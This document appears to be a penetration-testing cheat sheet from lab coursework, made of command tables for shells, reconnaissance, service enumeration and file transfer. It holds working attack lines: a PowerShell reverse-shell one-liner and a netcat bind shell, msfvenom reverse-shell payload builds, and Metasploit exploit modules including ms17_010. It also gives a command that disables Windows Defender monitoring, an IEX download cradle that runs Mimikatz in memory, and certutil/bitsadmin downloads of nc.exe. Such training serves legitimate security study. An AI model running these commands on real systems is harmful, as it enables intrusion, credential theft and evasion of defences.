# Cheat Sheets

| **Commands**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | **Description**                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol                                                                                                                    |
| `env`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use                             |
| `sudo nc -lvnp <port #>`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Starts a `netcat` listener on a specified port                                                                                                                                                          |
| `nc -nv <ip address of computer with listener started><port being listened on>`                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Connects to a netcat listener at the specified IP address and port                                                                                                                                      |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`                                                                                                                                                                                                                                                                                                                                                                                                                                           | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box                                                                                                        |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Powershell command using to disable real time monitoring in `Windows Defender`                                                                                                                          |
| `use exploit/windows/smb/psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`                                                                         |
| `shell`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Command used in a meterpreter shell session to drop into a `system shell`                                                                                                                               |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`                                                                                                                                                                                                                                                                                                                                                                                                                                                | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`                                                                                                                     |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`                                                                                                                                                                                                                                                                                                                                                                                                                                                  | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                                                                                                       |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`                                                                                                                                                                                                                                                                                                                                                                                                                                              | MSFvenom command used to generate a MacOS-based reverse shell payload                                                                                                                                   |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`                                                                                                                                                                                                                                                                                                                                                                                                                                            | MSFvenom command used to generate a ASP web reverse shell payload                                                                                                                                       |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a JSP web reverse shell payload                                                                                                                                       |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                                                                                                   |
| `use auxiliary/scanner/smb/smb_ms17_010`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`                                                                                                                           |
| `use exploit/windows/smb/ms17_010_psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17\_010                                                                                |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`                                                                               |
| `python -c 'import pty; pty.spawn("/bin/sh")'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Python command used to spawn an `interactive shell` on a linux-based system                                                                                                                             |
| `/bin/sh -i`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Spawns an interactive shell on a linux-based system                                                                                                                                                     |
| `perl —e 'exec "/bin/sh";'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Uses `perl` to spawn an interactive shell on a linux-based system                                                                                                                                       |
| `ruby: exec "/bin/sh"`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Uses `ruby` to spawn an interactive shell on a linux-based system                                                                                                                                       |
| `Lua: os.execute('/bin/sh')`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Uses `Lua` to spawn an interactive shell on a linux-based system                                                                                                                                        |
| `awk 'BEGIN {system("/bin/sh")}'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Uses `awk` command to spawn an interactive shell on a linux-based system                                                                                                                                |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Uses `find` command to spawn an interactive shell on a linux-based system                                                                                                                               |
| `find . -exec /bin/sh \; -quit`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system                                                                                                      |
| `vim -c ':!/bin/sh'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"                                                                                                           |
| `ls -la <path/to/fileorbinary>`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute          |
| `sudo -l`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Displays the commands that the currently logged on user can run as `sudo`                                                                                                                               |
| `/usr/share/webshells/laudanum`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Location of `laudanum webshells` on ParrotOS and Pwnbox                                                                                                                                                 |
| `/usr/share/nishang/Antak-WebShell`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Location of `Antak-Webshell` on Parrot OS and Pwnbox                                                                                                                                                    |

| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| ---------------------------- | ----------------------------------------- |
| `whois $TARGET`              | WHOIS lookup for the target.              |

***

### DNS Enumeration

| **Command**                        | **Description**                                      |
| ---------------------------------- | ---------------------------------------------------- |
| `nslookup $TARGET`                 | Identify the `A` record for the target domain.       |
| `nslookup -query=A $TARGET`        | Identify the `A` record for the target domain.       |
| `dig $TARGET @<nameserver/IP>`     | Identify the `A` record for the target domain.       |
| `dig a $TARGET @<nameserver/IP>`   | Identify the `A` record for the target domain.       |
| `nslookup -query=PTR <IP>`         | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>`     | Identify the `PTR` record for the target IP address. |
| `nslookup -query=ANY $TARGET`      | Identify `ANY` records for the target domain.        |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain.        |
| `nslookup -query=TXT $TARGET`      | Identify the `TXT` records for the target domain.    |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain.    |
| `nslookup -query=MX $TARGET`       | Identify the `MX` records for the target domain.     |
| `dig mx $TARGET @<nameserver/IP>`  | Identify the `MX` records for the target domain.     |

***

### Passive Subdomain Enumeration

| **Resource/Command**                                                                                               | **Description**                                                                                |
| ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| `VirusTotal`                                                                                                       | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url)             |
| `Censys`                                                                                                           | [https://censys.io/](https://censys.io/)                                                       |
| `Crt.sh`                                                                                                           | [https://crt.sh/](https://crt.sh/)                                                             |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u`                                  | All subdomains for a given domain.                                                             |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u`                                        | All TLDs found for a given domain.                                                             |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u`                                         | All results across all TLDs for a given domain.                                                |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u`                                         | Reverse DNS lookup on IP address.                                                              |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u`                                  | Reverse DNS lookup of a CIDR range.                                                            |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency.                                                                      |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done`    | Searching for subdomains and other information on the sources provided in the source.txt list. |

**Sources.txt**

Code: txt

```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

***

### Passive Infrastructure Identification

| **Resource/Command**                                   | **Description**                                                                      |
| ------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| `Netcraft`                                             | [https://www.netcraft.com/](https://www.netcraft.com/)                               |
| `WayBackMachine`                                       | [http://web.archive.org/](http://web.archive.org/)                                   |
| `WayBackURLs`                                          | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained.                           |

***

### Active Infrastructure Identification

| **Resource/Command**                                                      | **Description**                                                                      |
| ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `curl -I "http://${TARGET}"`                                              | Display HTTP headers of the target webserver.                                        |
| `whatweb -a https://www.facebook.com -v`                                  | Technology identification.                                                           |
| `Wappalyzer`                                                              | [https://www.wappalyzer.com/](https://www.wappalyzer.com/)                           |
| `wafw00f -v https://$TARGET`                                              | WAF Fingerprinting.                                                                  |
| `Aquatone`                                                                | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list.                           |

***

### Active Subdomain Enumeration

| **Resource/Command**                                                                                       | **Description**                                                                          |
| ---------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| `HackerTarget`                                                                                             | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/)       |
| `SecLists`                                                                                                 | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain`                                          | Zone Transfer using Nslookup against the target domain and its nameserver.               |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains.                                                                 |

***

### Virtual Hosts

| **Resource/Command**                                                                                                                                                                       | **Description**                                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"`                                                                                                                                 | Changing the HOST HTTP header to request a specific domain.                |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain.              |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612`                                                                                                            | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |

***

### Crawling

| **Resource/Command**                                                                                                                                 | **Description**                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| `ZAP`                                                                                                                                                | [https://www.zaproxy.org/](https://www.zaproxy.org/)                          |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website. |
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS`           | Mutated bruteforcing against the target web server.                           |

| **Command**                                               | **Description**                                                         |
| --------------------------------------------------------- | ----------------------------------------------------------------------- |
| `ftp <FQDN/IP>`                                           | Interact with the FTP service on the target.                            |
| `nc -nv <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `telnet <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp`    | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server.                  |

**SMB**

| **Command**                                       | **Description**                                           |
| ------------------------------------------------- | --------------------------------------------------------- |
| `smbclient -N -L //<FQDN/IP>`                     | Null session authentication on SMB.                       |
| `smbclient //<FQDN/IP>/<share>`                   | Connect to a specific SMB share.                          |
| `rpcclient -U "" <FQDN/IP>`                       | Interaction with the target using RPC.                    |
| `samrdump.py <FQDN/IP>`                           | Username enumeration using Impacket scripts.              |
| `smbmap -H <FQDN/IP>`                             | Enumerating SMB shares.                                   |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A`                   | SMB enumeration using enum4linux.                         |

**NFS**

| **Command**                                               | **Description**                                  |
| --------------------------------------------------------- | ------------------------------------------------ |
| `showmount -e <FQDN/IP>`                                  | Show available NFS shares.                       |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS`                                     | Unmount the specific NFS share.                  |

**DNS**

| **Command**                                                                                                   | **Description**                          |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `dig ns <domain.tld> @<nameserver>`                                                                           | NS request to the specific nameserver.   |
| `dig any <domain.tld> @<nameserver>`                                                                          | ANY request to the specific nameserver.  |
| `dig axfr <domain.tld> @<nameserver>`                                                                         | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing.                 |

**SMTP**

| **Command**           | **Description** |
| --------------------- | --------------- |
| `telnet <FQDN/IP> 25` |                 |

**IMAP/POP3**

| **Command**                                            | **Description**                         |
| ------------------------------------------------------ | --------------------------------------- |
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps`            | Connect to the IMAPS service.           |
| `openssl s_client -connect <FQDN/IP>:pop3s`            | Connect to the POP3s service.           |

**SNMP**

| **Command**                                       | **Description**                                     |
| ------------------------------------------------- | --------------------------------------------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>`   | Querying OIDs using snmpwalk.                       |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*`          | Bruteforcing SNMP service OIDs.                     |

**MySQL**

| **Command**                                 | **Description**            |
| ------------------------------------------- | -------------------------- |
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |

**MSSQL**

| **Command**                                     | **Description**                                          |
| ----------------------------------------------- | -------------------------------------------------------- |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |

**IPMI**

| **Command**                                    | **Description**         |
| ---------------------------------------------- | ----------------------- |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)`    | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes.       |

**Linux Remote Management**

| **Command**                                                 | **Description**                                       |
| ----------------------------------------------------------- | ----------------------------------------------------- |
| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |

**Windows Remote Management**

| **Command**                                                   | **Description**                                 |
| ------------------------------------------------------------- | ----------------------------------------------- |
| `rdp-sec-check.pl <FQDN/IP>`                                  | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`             | Log in to the RDP server from Linux.            |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.                     |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service.          |

**Oracle TNS**

| **Command**                                                                                                          | **Description**                                                                                         |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `./odat.py all -s <FQDN/IP>`                                                                                         | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                               | Log in to the Oracle database.                                                                          |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` |                                                                                                         |

## File Transfers

|  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                           | Download a file with PowerShell             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
